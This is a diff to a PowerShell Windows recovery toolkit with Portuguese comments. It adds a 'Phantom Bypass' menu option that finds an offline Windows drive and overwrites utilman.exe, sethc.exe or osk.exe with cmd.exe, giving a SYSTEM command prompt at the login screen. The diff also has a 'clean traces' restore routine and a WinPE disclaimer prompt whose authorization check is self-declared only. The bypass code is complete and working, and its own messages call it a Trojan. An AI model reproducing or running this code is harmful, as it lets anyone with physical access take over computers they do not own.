@@ -40,10 +40,34 @@ function Write-MRLog {
 Write-MRLog "Sessao v2.0 Elite iniciada." "START"
 
 # -----------------------------------------------------------------------------
-# FUNCAO EULA (WEB SERVER EMBUTIDO NA MEMORIA COM VISUAL ELITE)
+# FUNCAO EULA (WEB SERVER EMBUTIDO / FALLBACK WINPE)
 # -----------------------------------------------------------------------------
 function Start-EULAListener {
 
+    # SENSOR DE AMBIENTE: Verifica se esta rodando no WinPE (Boot pelo PenDrive)
+    $isWinPE = Test-Path "HKLM:\SYSTEM\CurrentControlSet\Control\MiniNT"
+
+    if ($isWinPE) {
+        Write-Host "`n========================================================" -ForegroundColor Red
+        Write-Host "  TERMO DE RESPONSABILIDADE - MODO RECUPERACAO (WINPE)  " -ForegroundColor Yellow
+        Write-Host "========================================================" -ForegroundColor Red
+        Write-Host "ATENCAO: Voce esta acessando as ferramentas de Nivel Kernel." -ForegroundColor Gray
+        Write-Host "O uso do Bypass e alteracoes de BCD sao de sua total responsabilidade." -ForegroundColor Gray
+        Write-Host "O uso malicioso em computadores nao autorizados e estritamente proibido.`n" -ForegroundColor DarkGray
+        
+        $resp = Read-Host "Voce declara que tem autorizacao e ACEITA os riscos? (S/N)"
+        if ($resp -match "^[sS]") {
+            Write-Host "`n[OK] ACESSO LIBERADO. EULA ACEITO." -ForegroundColor Green
+            Start-Sleep -Seconds 1
+            return
+        } else {
+            Write-Host "`n[X] ACESSO NEGADO. O sistema sera encerrado." -ForegroundColor Red
+            Start-Sleep -Seconds 3
+            exit
+        }
+    }
+
+    # SE ESTIVER NO WINDOWS NORMAL, RODA O SERVIDOR HTML LINDO
     $port = 8899
     $accepted = $false
 
@@ -122,7 +146,6 @@ function Start-EULAListener {
         font-size: 14px;
     }
     
-    /* Scrollbar Customizada Estilo Mac/Dark */
     .content::-webkit-scrollbar { width: 8px; }
     .content::-webkit-scrollbar-track { background: var(--bg); border-radius: 4px; }
     .content::-webkit-scrollbar-thumb { background: #52525b; border-radius: 4px; }
@@ -188,7 +211,6 @@ function Start-EULAListener {
         const hintText = document.getElementById("hintText");
         const pulse = document.getElementById("pulseDot");
         
-        // Margem de erro de 20px para facilitar a liberação
         if (content.scrollTop + content.clientHeight >= content.scrollHeight - 20) {
             button.disabled = false;
             pulse.style.backgroundColor = "#10b981";
@@ -1509,6 +1531,80 @@ function Open-SupportMenu {
         }
     } while ($true)
 }
+# -----------------------------------------------------------------------------
+# ENGINE DE BYPASS FANTASMA (ZERO-TOUCH)
+# -----------------------------------------------------------------------------
+function Invoke-PhantomBypass {
+    Show-Header
+    Write-Host "=== INJECAO DE BYPASS FANTASMA (ROOT ACCESS) ===" -ForegroundColor Red
+    
+    Write-Host "[*] Mapeando unidades de disco automaticamente..." -ForegroundColor DarkGray
+    $osDrive = $null
+    # Varre as letras de C a Z para achar o Windows (O WinPE roda no X:)
+    foreach ($letter in 67..90) { 
+        $drv = [char]$letter + ":"
+        if (Test-Path "$drv\Windows\System32\cmd.exe") { $osDrive = $drv; break }
+    }
+    
+    if (-not $osDrive) {
+        Write-Host "`n[X] ERRO CRÍTICO: Nenhuma instalacao do Windows detectada." -ForegroundColor Red
+        Write-Host "    Pode ser um disco RAID/VMD sem driver ou BitLocker bloqueado." -ForegroundColor Yellow
+        Pause-MR; return
+    }
+    
+    Write-Host "[+] Sistema Operacional travado encontrado na unidade: [$osDrive]`n" -ForegroundColor Green
+    
+    Write-Host " Escolha a Porta de Entrada (Vetor):" -ForegroundColor Yellow
+    Write-Host " [1] Utilman (Botao de Acessibilidade no canto da tela)" -ForegroundColor Cyan
+    Write-Host " [2] Sethc   (O Fantasma: Apertar a tecla SHIFT 5 vezes)" -ForegroundColor Cyan
+    Write-Host " [3] OSK     (Teclado Virtual na tela de bloqueio)" -ForegroundColor Cyan
+    Write-Host " [4] DESFAZER / LIMPAR RASTROS (Restaurar Seguranca Original)" -ForegroundColor Green
+    Write-Host "`n [0] Voltar" -ForegroundColor DarkGray
+    
+    $bOpt = Read-Host "`nDigite a opcao desejada"
+    $target = ""
+    
+    switch ($bOpt) {
+        "1" { $target = "utilman.exe" }
+        "2" { $target = "sethc.exe" }
+        "3" { $target = "osk.exe" }
+        "4" {
+            Write-Host "`n[*] Iniciando protocolo de limpeza de rastros..." -ForegroundColor Yellow
+            $files = @("utilman.exe", "sethc.exe", "osk.exe")
+            $cleaned = 0
+            foreach ($f in $files) {
+                if (Test-Path "$osDrive\Windows\System32\$f.bak") {
+                    Remove-Item "$osDrive\Windows\System32\$f" -Force -ErrorAction SilentlyContinue
+                    Rename-Item "$osDrive\Windows\System32\$f.bak" $f -Force -ErrorAction SilentlyContinue
+                    Write-Host " -> [$f] restaurado. Vulnerabilidade fechada." -ForegroundColor Green
+                    $cleaned++
+                }
+            }
+            if ($cleaned -eq 0) { Write-Host " -> Nenhum backup encontrado. O sistema ja parece estar limpo." -ForegroundColor DarkGray }
+            Pause-MR; return
+        }
+        "0" { return }
+        default { return }
+    }
+    
+    if ($target) {
+        $sys32 = "$osDrive\Windows\System32"
+        try {
+            # Se o backup ja existir, pula a renomeacao para nao sobrescrever o arquivo original bom com um CMD
+            if (-not (Test-Path "$sys32\$target.bak")) {
+                Rename-Item "$sys32\$target" "$target.bak" -Force -ErrorAction Stop
+            }
+            Copy-Item "$sys32\cmd.exe" "$sys32\$target" -Force -ErrorAction Stop
+            
+            Write-Host "`n[SUCESSO EXTREMO] O Cavalo de Troia [$target] foi injetado!" -ForegroundColor Green
+            Write-Host "-> Pode fechar o terminal e reiniciar o PC normalmente." -ForegroundColor Cyan
+            if ($target -eq "sethc.exe") { Write-Host "-> Na tela de login, aperte a tecla SHIFT 5x rapido para virar ROOT." -ForegroundColor Magenta }
+        } catch {
+            Write-Host "`n[X] Falha na injecao. O disco pode estar protegido ou o antivirus do WinPE barrou." -ForegroundColor Red
+        }
+        Pause-MR
+    }
+}
 
 # -----------------------------------------------------------------------------
 # BLOCO 10: RECUPERACAO OFFLINE (A SOLUCAO DO ERRO FATAL "$drv")
@@ -1523,7 +1619,7 @@ function Open-RecoveryMenu {
         Write-Host " [2] Verificar integridade do sistema (SFC /offbootdir)" -ForegroundColor Cyan
         Write-Host " [3] Reparar Boot (Bootrec /fixmbr, /fixboot, /rebuildbcd)" -ForegroundColor Cyan
         Write-Host " [4] Verificar erros no disco (CHKDSK /f /r)" -ForegroundColor Cyan
-        Write-Host " [5] Desativar Conta Administrador (Bypass utilman.exe)" -ForegroundColor Red
+        Write-Host " [5] Injetar Bypass Fantasma Multi-Vetor (Root)    " -ForegroundColor Red
         Write-Host " [6] Backup Automatico de Usuarios (Robocopy offline)" -ForegroundColor Cyan
         Write-Host " [7] Detectar Criptografia BitLocker" -ForegroundColor Cyan
         Write-Host " [8] Restaurar BCD (Bcdboot)" -ForegroundColor Cyan
@@ -1547,17 +1643,7 @@ function Open-RecoveryMenu {
                 if ($drv) { try { chkdsk "$($drv):" /f /r } catch {} }
                 Pause-MR 
             }
-            "5" { 
-                $drv = Read-Host "Letra do Windows (ex: C ou D)"
-                if ($drv) { 
-                    try { 
-                        Rename-Item "$($drv):\Windows\System32\utilman.exe" "utilman.exe.bak" -Force -ErrorAction Stop
-                        Copy-Item "$($drv):\Windows\System32\cmd.exe" "$($drv):\Windows\System32\utilman.exe" -Force -ErrorAction Stop
-                        Write-Host "Bypass Injetado com Sucesso! Reinicie e clique na acessibilidade." -ForegroundColor Green 
-                    } catch { Write-Host "Erro. Unidade bloqueada." -ForegroundColor Red } 
-                }
-                Pause-MR 
-            }
+           "5" { Invoke-PhantomBypass }
             "6" { Write-Host "Comando sugerido ignorando NTFS:`nrobocopy C:\Users E:\Backup /E /ZB /R:1 /W:1" -ForegroundColor Cyan; Pause-MR }
             "7" { 
                 $drv = Read-Host "Letra da unidade (ex: C)"
